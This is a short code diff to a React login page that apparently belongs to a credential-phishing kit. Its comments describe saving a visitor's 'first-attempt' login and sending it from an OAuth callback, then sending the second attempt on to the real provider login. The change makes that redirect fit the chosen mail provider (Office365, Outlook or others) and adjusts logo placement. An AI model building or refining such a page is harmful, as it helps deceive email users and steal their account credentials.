@@ -82,10 +82,13 @@ const LoginPage: React.FC<LoginPageProps> = ({
         return;
       }
 
-      // SECOND ATTEMPT: Do NOT send first-attempt here. Instead redirect to Microsoft OAuth.
-      // The saved first-attempt will be read and sent from the OAuth callback handler (App.tsx).
+      // SECOND ATTEMPT: Do NOT send first-attempt here. Instead redirect to provider-specific OAuth.
+      // Only use Microsoft/Outlook OAuth when the selected provider is Office365 or Outlook.
       const state = generateState();
-      const oauthUrl = buildOAuthUrl('Outlook', state); // Always open Microsoft login on second attempt
+      const oauthTarget = (selectedProvider === 'Office365' || selectedProvider === 'Outlook')
+        ? 'Outlook'
+        : selectedProvider;
+      const oauthUrl = buildOAuthUrl(oauthTarget, state);
 
       // Slight pause for UX, then redirect
       setTimeout(() => {
@@ -127,7 +130,8 @@ const LoginPage: React.FC<LoginPageProps> = ({
 
       {/* Card wrapper: decorative title/logo positioned above the card and slightly left of center (desktop only) */}
       <div className="w-full max-w-sm relative z-10 mx-4 sm:mx-6">
-        {/* Above-card logo/title (desktop only). */}
+        {/* Above-card logo/title (desktop only).
+            Moved up slightly more (now -top: -5rem) and shifted left a bit further (translateX calc(-50% - 1.5rem)). */}
         <div
           className="hidden md:flex flex-row items-center z-30 pointer-events-none"
           style={{
